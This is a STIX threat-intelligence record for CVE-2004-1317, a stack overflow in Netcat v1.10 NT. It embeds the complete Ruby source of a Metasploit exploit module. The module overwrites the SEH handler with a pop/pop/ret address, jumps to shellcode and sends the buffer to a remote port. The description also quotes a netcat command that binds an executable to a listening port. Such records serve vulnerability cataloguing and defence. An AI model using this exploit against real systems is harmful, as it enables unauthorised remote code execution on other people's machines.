{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--510f2a3b-1463-4b91-be53-e4bc29654676",
    "created": "2024-08-14T16:45:53.194773Z",
    "modified": "2024-08-14T16:45:53.194777Z",
    "name": "Netcat v1.10 NT Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Netcat v1.10 NT. By sending an overly long string we are able to overwrite SEH. The vulnerability exists when netcat is used to bind (-e) an executable to a port in doexec.c. This module tested successfully using \"c:\\>nc -L -p 31337 -e ftp\". ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/netcat110_nt.rb",
            "external_id": "netcat110_nt.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-1317"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t=> 'Netcat v1.10 NT Stack Buffer Overflow',\n      'Description'\t=> %q{\n          This module exploits a stack buffer overflow in Netcat v1.10 NT. By sending\n          an overly long string we are able to overwrite SEH. The vulnerability\n          exists when netcat is used to bind (-e) an executable to a port in doexec.c.\n          This module tested successfully using \"c:\\>nc -L -p 31337 -e ftp\".\n        },\n      'Author'       => 'aushack',\n      'Arch'\t\t\t=> [ ARCH_X86 ],\n      'License'\t\t=> MSF_LICENSE,\n      'References'\t=>\n        [\n          [ 'CVE', '2004-1317' ],\n          [ 'OSVDB', '12612' ],\n          [ 'BID', '12106' ],\n          [ 'EDB', '726' ]\n        ],\n      'Privileged'\t\t=> false,\n      'DefaultOptions'\t=>\n        {\n          'EXITFUNC'\t=> 'thread',\n        },\n      'Payload'\t\t=>\n        {\n          'Space'\t\t\t\t=> 236,\n          'BadChars'\t\t\t=> \"\\x00\\x0a\\x0d\",\n          'StackAdjustment'\t=> -3500,\n        },\n      'Platform' => ['win'],\n      'Targets'  =>\n        [\n          # Patrick - Tested OK 2007/09/26 w2ksp0, w2ksp4, xpsp2 en.\n          [ 'Universal nc.exe', { 'Ret' => 0x0040a6ce } ], # p/p/r nc.exe\n        ],\n      'DisclosureDate' => '2004-12-27',\n      'DefaultTarget' => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def exploit\n    connect\n\n    sploit = rand_text(277, payload_badchars)\n    sploit[0, payload.encoded.length] = payload.encoded\n    sploit[236, 2] = Rex::Arch::X86.jmp_short(6)\n    sploit[240, 4] = [target['Ret']].pack('V')\n    sploit[244, 5] = Rex::Arch::X86.jmp(0xffffff08)\n\n    sock.put(sploit)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-12-27",
    "x_mitre_platforms": [
        "['win']"
    ]
}